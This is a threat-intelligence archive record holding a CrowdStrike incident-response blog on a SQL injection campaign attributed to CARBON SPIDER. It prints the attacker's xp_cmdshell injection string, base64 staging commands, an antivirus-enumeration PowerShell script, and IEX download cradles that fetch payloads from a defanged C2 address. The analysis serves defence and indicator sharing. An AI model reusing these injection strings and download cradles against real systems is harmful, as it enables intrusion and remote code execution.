{
    "id": "c69e5e40-df6a-44f9-afa4-5261e94dd547",
    "created_at": "2023-01-12T14:59:38.452804Z",
    "updated_at": "2025-03-27T02:16:58.096813Z",
    "deleted_at": null,
    "sha1_hash": "115eca945977d9d9d80821777d878d70fdf9556a",
    "title": "2021-08-03 - Squashing SPIDERS- Threat Intelligence, Threat Hunting and Rapid Response Stops SQL Injection Campaign",
    "authors": "",
    "file_creation_date": "2022-05-27T23:15:34Z",
    "file_modification_date": "2022-05-27T23:15:34Z",
    "file_size": 1103402,
    "plain_text": "# How CrowdStrike Stopped an SQL Injection Campaign\n\n**[crowdstrike.com/blog/how-crowdstrike-stopped-an-sql-injection-campaign/](https://www.crowdstrike.com/blog/how-crowdstrike-stopped-an-sql-injection-campaign/)**\n\nMichael DeCristofaro - Eric Loui - Josh Reynolds August 3, 2021\n\nIn this blog, we describe a campaign of recent activity where CrowdStrike observed an actor\n[likely related to CARBON SPIDER performing SQL injections in order to gain code execution](https://adversary.crowdstrike.com/en-US/adversary/carbon-spider/)\nas an initial infection vector. A combined effort from Falcon Complete™ (managed detection\nand response), Falcon OverWatch™ (managed threat hunting), and CrowdStrike Intelligence\nuncovered this campaign. The attack demonstrates how CARBON SPIDER has likely\nintroduced new tactics, techniques and procedures (TTPs) following the actor’s apparent\ntermination of the _[Darkside ransomware-as-a-Service program in response to scrutiny](https://www.crowdstrike.com/blog/how-ransomware-adversaries-reacted-to-the-darkside-pipeline-attack/)_\n[following the Colonial Pipeline Darkside incident.](https://www.crowdstrike.com/blog/falcon-protects-from-darkside-ransomware/)\n\nCollaboration between Falcon Complete, Falcon OverWatch and CrowdStrike Intelligence is\na force multiplier protecting customers from the latest threats. Leveraging Falcon OverWatch\nand their expert threat hunters, Falcon Complete is able to perform timely surgical\nremediation, extract important artifacts, and ultimately stop breaches.\n\nPartnering with CrowdStrike Intelligence allows these teams to take advantage of incident\n[attribution, such as understanding adversary motives (targeted, financial, or hacktivism), their](https://www.crowdstrike.com/cybersecurity-101/hacktivism/)\nTactics, Techniques, and Procedures (TTPs), as well as enabling proactive discovery of actor\n\n\n-----\n\nIndicators of Attack and Indicators of Compromise to keep customers safe. Knowing an\nadversary and their intent is powerful knowledge during the triage and remediation process\nto best track past activity and anticipate future actions.\n\n## Falcon Complete Investigates and Responds\n\nFalcon Complete began responding to detections triggered within the CrowdStrike Falcon®\n[platform tagged with MITRE ATT&CK technique T1059, “Execution via PowerShell” where a](https://attack.mitre.org/techniques/T1059/)\nMicrosoft SQL Server executable was blocked from launching a PowerShell script. The\nFalcon Complete team acknowledged and began investigating the detections within 6\nminutes. Threat hunters from the Falcon OverWatch team identified a broad range of\nreconnaissance activity as highly suspicious, and flagged the additional activity for review 11\nminutes after the initial detection occurred.\n\nFigure 1. Initial detection\n\n\n-----\n\nFigure 2. OverWatch enriched process tree\n\nFurther reviewing the process tree with added OverWatch enrichment, Falcon identified\nmultiple CMD.EXE instances executing under Microsoft SQL Server.\n\n\n-----\n\n```\nping -n 12 127.0.0.1\n\n```\n```\necho \nZnVuY3Rpb24gc3RhcnRQcyAoJG5hbWVzKXsgJGNoZWNrTGlzdCA9JG5hbWVzLlNwbGl0KCIgIik7\n >> \"F:\\Microsoft SQL Server\\MSSQL13.MSSQLSERVER\\MSSQL\\Log\\tmpfhikx.txt\"\necho $Base64 = Get-Content -Path \"F:\\Microsoft SQL\nServer\\MSSQL13.MSSQLSERVER\\MSSQL\\Log\\tmpfhikx.txt\"; $Base64 = $Base64 replace \"`t|`n|`r\",\"\"; $Content =\n[System.Convert]::FromBase64String($Base64); Set-Content -Path\n\"C:\\Windows\\Temp\\abc.ps1\" -Value $Content -Encoding Byte >> \"F:\\Microsoft\nSQL Server\\MSSQL13.MSSQLSERVER\\MSSQL\\Log\\tmppsrlje.ps1\"\npowershell -ExecutionPolicy ByPass -File \"F:\\Microsoft SQL\nServer\\MSSQL13.MSSQLSERVER\\MSSQL\\Log\\tmppsrlje.ps1\" & del /F /Q\n\"F:\\Microsoft SQL Server\\MSSQL13.MSSQLSERVER\\MSSQL\\Log\\tmpfhikx.txt\" & del\n/F /Q \"F:\\Microsoft SQL Server\\MSSQL13.MSSQLSERVER\\MSSQL\\Log\\tmppsrlje.ps1\"\npowershell -ExecutionPolicy ByPass -File \"F:\\Microsoft SQL\nServer\\MSSQL13.MSSQLSERVER\\MSSQL\\Log\\tmppsrlje.ps1\"\n\n```\n```\nC:\\Windows\\Temp\\abc.ps1\n\n```\n```\necho 1\n\n```\n```\npowershell.exe -Enc\n\"SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB\n\n```\n```\necho 1\n\n```\n\nReviewing the commands shows the actor used both `echo 1 and` `ping -n [number]`\n```\n127.0.0.1 multiple times to ensure connectivity and responsiveness of the host to the SQL\n\n```\nInjection attempts.\n\nAfter verifying access, the actor used the `echo command to write base64-encoded content`\ninto a file located at `F:\\Microsoft SQL`\n```\nServer\\MSSQL13.MSSQLSERVER\\MSSQL\\Log\\tmpfhikx.txt .\n\n```\nNext, PowerShell was used to `echo a base64 decoding script into` `F:\\Microsoft SQL`\n```\nServer\\MSSQL13.MSSQLSERVER\\MSSQL\\Log\\tmppsrlje.ps1 that would decode tmpfhikx.txt\n\n```\nand write the final payload using `Set-Content to` `C:\\Windows\\Temp\\abc.ps1 .`\n\n\n-----\n\nThe actor then attempted to execute `tmppsrlje.ps1, and finally execute the decoded`\npayload `C:\\Windows\\Temp\\abc.ps1 . The decoded content of the Base64 payload is`\nbelow.\n```\nfunction startPs ($names)\n{\n$checkList =$names.Split(\" \");\n$process = Get-Process;\nfor($i=0; $i -lt $process.Length; $i++)\n{\nif($checkList.Contains($process[$i].ProcessName))\n{\nreturn \"+\";\n}\n}\nreturn \"-\";\n}\nstartPs \"ALMon Alsvc SAVAdminService SavService AvastSvc Avastgui PSUAMain\nPSUAService PSANHost egui ekrn avgcsrva avgemca avgfwsa avgidsagenta avgnsa avgsvca\navgui avguix avgwdsvca AVGUI AVGSvc EndpointService EndpointIntegration BITS\nDevMgmtService ProductAgentService bdagent ZoneAlarmUpdate ZoneAlarmCrashHandler64\nZoneAlarmCrashHandler ZA_WSC ZANG_MgrSvc ZANG_AV UI_Main AR_Service\"\n\n```\nThe above script is an antivirus enumeration PowerShell payload that acquires running\nprocesses using `Get-Process and searches for the following antivirus processes:`\n\n\n-----\n\n```\nAVGSvc\n\n```\n\nIf any of these process names are found, the character “+” is returned, otherwise the “–”\ncharacter is returned.\n\nAfter none of the anti-viruses from the enumeration script were found, the actor then\nattempted to execute a base64 encoded PowerShell command.\n```\n   powershell.exe -Enc\n   \"SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA\n\n```\nThe PowerShell command decodes to an Invoke-Expression download cradle for an\nadditional PowerShell script.\n```\n   IEX (New-Object\n   Net.WebClient).DownloadString('http://46.17.105[.]207/6432565764923.ps1')\n\n```\nFalcon blocked the download of this script. CrowdStrike Intelligence subsequently retrieved\nthe payload and confirmed it is a distinctive PowerShell stager named Demux commonly\nused by CARBON SPIDER.\n\n_Demux_ [executes a stager DLL in memory. The stager DLL leveraged in this attack uses the](https://attack.mitre.org/techniques/T1055/)\nIP addresses `46.17.105[.]207 and` `185.242.85[.]126` for command-and-control (C2)\ncommunications. CrowdStrike Intelligence has observed exclusive use of Demux PowerShell\nloaders and the stager DLLs during CARBON SPIDER-related activity. Based on the current\navailable evidence, it is assessed with low confidence that this activity originates from\nCARBON SPIDER.\n\nFor Falcon OverWatch and Falcon Complete on the frontlines, attribution is an important\npiece of information to take into account. In this case, CARBON SPIDER is a financially\nmotivated eCrime actor, who has recently been conducting high profile Big Game Hunting\n\n\n-----\n\nransomware campaigns. Attribution from CrowdStrike Intelligence allows Threat Hunters and\nMDR Analysts understand the adversary’s intent and investigate for Tactics, Techniques, and\nProcedures commonly used by the known threat actor.\n\nConcurrently to collaborating with CrowdStrike Intelligence, Falcon Complete was still\ntriaging and responding to the active incident in the customer environment. By this point the\nSQL server had been network contained and further investigation into the initial access\nvector was underway.\n\n### Pivoting to the Web Server to Confirm Initial Access Vector\n\nAfter reviewing the initial OverWatch alert, Falcon Complete pivoted to reviewing the IIS logs\nfrom the customer’s web server at the time of the incident to confirm the initial access vector\nas SQL Injection. Through analysis of the logs, Falcon Complete confirmed that the actor\nused the SQL `xp_cmdshell command to execute multiple PowerShell (PS) payloads.`\n\nIn an attempt to hide their intent and to possibly bypass security technologies, such as webapplication firewalls, the actor made use of multiple encoding techniques within the SQLinjection statements. An example injection can be found here:\n```\n   ‘;dEClarE @czyd VaRcHar(8000);SEt @czyd=0x6563686f2031;iNsERt inTo\n   SqLMaPoUtPUT(data) eXec master..xp_cmdshell @czyd-\n```\nThis injection finishes the legitimate SQL statement using a single quote (‘), proceeds to\ncreate the variable named `czyd, sets its contents to the hexadecimal-encoded value of`\n```\n0x6563686f2031 (which decodes to echo 1 ), and executes the variable using eXec\nmaster..xp_cmdshell @czyd . The use of iNsERt inTo SqLMaPoUtPUT(data) indicates\n\n```\nthe actor likely leveraged the sqlmap tool to perform automated SQL injection against the\ntarget web application.\n\nCARBON SPIDER’s PowerShell payloads were executed using the encoding patterns\ndescribed above within additional SQL-injection statements.\n\nAn interesting artifact recovered from the web server IIS logs showed the actor’s failed\nattempts to continue exploitation after the SQL server was network contained. After their\nremote download was blocked, the actor attempted to echo the Demux PowerShell content\ninto a file to execute, however the command failed due to the SQL server being contained.\nBy reviewing the IIS logs, Falcon Complete was then able to provide the customer with\nspecific information on the SQL Injection Vulnerabilities, and provide them with key\ninformation for fixing the vulnerable web page.\n\nFalcon Complete began response within 6 minutes, contained the threat in under 30\nminutes, and fully remediated the host within 1 hour and 45 minutes, with active support from\nFalcon OverWatch and CrowdStrike Intel. By stopping the breach before the actor could\n\n\n-----\n\nachieve their goals and cause any significant impact, Falcon Complete again demonstrated\nthe critical importance of rapid response.\n\n## Additional OverWatch Observations\n\nCrowdStrike Falcon OverWatch observed a similar incident, in which successful SQL\ninjection led to execution of encoded PowerShell commands. The commands decoded to:\n```\n   $p=((New-Object\n   Net.WebClient).DownloadString('http[:]//46.17.105[.]207/lzbt6001sop_64refl.ps1'))\n   ('IeX')\n\n```\nThis command downloaded a Demux PowerShell loader, which loads a DLL into memory.\nThis DLL used the same IP addresses `46.17.105[.]207 and` `185.242.85[.]126 for C2`\ncommunications.\n\nIn addition to the PowerShell download cradle, OverWatch also observed the actor using the\nsame `echo 1 and` `ping commands, as well as` `wmic to query the domain name.`\n```\n   echo 1\n   ping -n 10 127.0.0.1\n   wmic ComputerSystem get domain\n\n## Conclusion\n\n```\n\n-----\n\nThis incident described in this blog is attributed with low confidence to CARBON SPIDER,\nbased on use of the Demux Loader and stager DLL combination. CARBON SPIDER’s likely\nuse of [SQL injection as an initial access method represents a new development, marking a](https://www.crowdstrike.com/cybersecurity-101/sql-injection/)\ndeparture from the typical indiscriminate spam campaigns the actor continues to conduct.\nGaining code execution on an MSSQL server within an environment could provide an\navenue for the actor to move laterally into the corporate network if compromised servers are\nnot located in a Demilitarized Zone (DMZ).\n\nThis campaign demonstrates CARBON SPIDER’s willingness and ability to introduce\ndifferent TTPs in order to compromise victims. It is likely the actor will continue to leverage\nboth spam and server exploitation to achieve initial access in the near-term.\n\nFalcon Complete, Falcon OverWatch and CrowdStrike Intelligence continually partner to\nproactively hunt, identify, and remediate malicious activity from threat actors. By working\ntogether, these teams take full advantage of CrowdStrike’s expertise and keep CrowdStrike\ncustomers protected 24/7/365.\n\n**Additional Resources**\n\n_[Learn more by visiting the Falcon Complete product webpage.](https://www.crowdstrike.com/endpoint-security-products/falcon-complete/)_\n_Read a white paper: CrowdStrike Falcon Complete: Instant Cybersecurity Maturity for_\n_Organizations of All Sizes._\n_Test CrowdStrike next-gen AV for yourself:_ _[Start your free trial of Falcon Prevent™.](https://go.crowdstrike.com/try-falcon-prevent.html)_\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2021/2021-08-03 - Squashing SPIDERS- Threat Intelligence, Threat Hunting and Rapid Response Stops SQL Injection Campaign.pdf"
    ],
    "report_names": [
        "2021-08-03 - Squashing SPIDERS- Threat Intelligence, Threat Hunting and Rapid Response Stops SQL Injection Campaign.pdf"
    ],
    "threat_actors": [
        {
            "id": "aa73cd6a-868c-4ae4-a5b2-7cb2c5ad1e9d",
            "created_at": "2022-10-25T16:07:24.139848Z",
            "updated_at": "2025-03-27T02:02:10.120505Z",
            "deleted_at": null,
            "main_name": "Safe",
            "aliases": [],
            "source_name": "ETDA:Safe",
            "tools": [
                "DebugView",
                "LZ77",
                "OpenDoc",
                "SafeDisk",
                "TypeConfig",
                "UPXShell",
                "UsbDoc",
                "UsbExe"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "bfded1cf-be73-44f9-a391-0751c9996f9a",
            "created_at": "2022-10-25T15:50:23.337107Z",
            "updated_at": "2025-03-27T02:00:55.445946Z",
            "deleted_at": null,
            "main_name": "FIN7",
            "aliases": [
                "FIN7",
                "GOLD NIAGARA",
                "ITG14",
                "Carbon Spider",
                "ELBRUS",
                "Sangria Tempest"
            ],
            "source_name": "MITRE:FIN7",
            "tools": [
                "Mimikatz",
                "AdFind",
                "JSS Loader",
                "HALFBAKED",
                "REvil",
                "PowerSploit",
                "CrackMapExec",
                "Carbanak",
                "Pillowmint",
                "Cobalt Strike",
                "POWERSOURCE",
                "RDFSNIFFER",
                "SQLRat",
                "Lizar",
                "TEXTMATE",
                "BOOSTWRITE"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "f4f16213-7a22-4527-aecb-b964c64c2c46",
            "created_at": "2024-06-19T02:03:08.090932Z",
            "updated_at": "2025-03-27T02:05:17.387119Z",
            "deleted_at": null,
            "main_name": "GOLD NIAGARA",
            "aliases": [
                "Carbanak",
                "Carbon Spider ",
                "FIN7 ",
                "Navigator ",
                "Sangria Tempest ",
                "TelePort Crew ",
                "Calcium "
            ],
            "source_name": "Secureworks:GOLD NIAGARA",
            "tools": [
                " Carbanak",
                " Cobalt Strike",
                " DICELOADER",
                " DRIFTPIN",
                " GGLDR",
                " GRIFFON",
                " JSSLoader",
                " Meterpreter",
                " OFFTRACK",
                " PILLOWMINT",
                " POWERTRASH",
                " SUPERSOFT",
                " TAKEOUT",
                " TinyMet",
                "Bateleur"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "bb8702c5-52ac-4359-8409-998a7cc3eeaf",
            "created_at": "2023-01-06T13:46:38.405479Z",
            "updated_at": "2025-03-27T02:00:02.82533Z",
            "deleted_at": null,
            "main_name": "FIN7",
            "aliases": [
                "JokerStash",
                "ATK32",
                "G0046",
                "Coreid",
                "Carbanak",
                "Sangria Tempest",
                "CARBON SPIDER",
                "GOLD NIAGARA",
                "G0008",
                "ELBRUS",
                "Carbon Spider"
            ],
            "source_name": "MISPGALAXY:FIN7",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "ed3810b7-141a-4ed0-8a01-6a972b80458d",
            "created_at": "2022-10-25T16:07:23.443259Z",
            "updated_at": "2025-03-27T02:02:09.801771Z",
            "deleted_at": null,
            "main_name": "Carbanak",
            "aliases": [
                "Anunak",
                "Carbanak",
                "Carbon Spider",
                "ELBRUS",
                "Gold Waterfall",
                "Sangria Tempest"
            ],
            "source_name": "ETDA:Carbanak",
            "tools": [
                "AVE_MARIA",
                "Agentemis",
                "AmmyyRAT",
                "Antak",
                "Anunak",
                "Ave Maria",
                "AveMariaRAT",
                "BABYMETAL",
                "BIRDDOG",
                "Backdoor Batel",
                "Batel",
                "Bateleur",
                "BlackMatter",
                "Boostwrite",
                "Cain & Abel",
                "Carbanak",
                "Cl0p",
                "Cobalt Strike",
                "CobaltStrike",
                "DNSMessenger",
                "DNSRat",
                "DNSbot",
                "DRIFTPIN",
                "DarkSide",
                "FOXGRABBER",
                "FlawedAmmyy",
                "HALFBAKED",
                "JS Flash",
                "KLRD",
                "MBR Eraser",
                "Mimikatz",
                "Nadrac",
                "Odinaff",
                "POWERPIPE",
                "POWERSOURCE",
                "PsExec",
                "SQLRAT",
                "Sekur",
                "Sekur RAT",
                "SocksBot",
                "SoftPerfect Network Scanner",
                "Spy.Agent.ORM",
                "TEXTMATE",
                "TeamViewer",
                "TiniMet",
                "TinyMet",
                "Toshliph",
                "VB Flash",
                "WARPRISM",
                "avemaria",
                "cobeacon"
            ],
            "source_id": "ETDA",
            "reports": null
        }
    ],
    "ts_created_at": 1673535578,
    "ts_updated_at": 1743041818,
    "ts_creation_date": 1653693334,
    "ts_modification_date": 1653693334,
    "files": {
        "pdf": "https://archive.orkl.eu/115eca945977d9d9d80821777d878d70fdf9556a.pdf",
        "text": "https://archive.orkl.eu/115eca945977d9d9d80821777d878d70fdf9556a.txt",
        "img": "https://archive.orkl.eu/115eca945977d9d9d80821777d878d70fdf9556a.jpg"
    }
}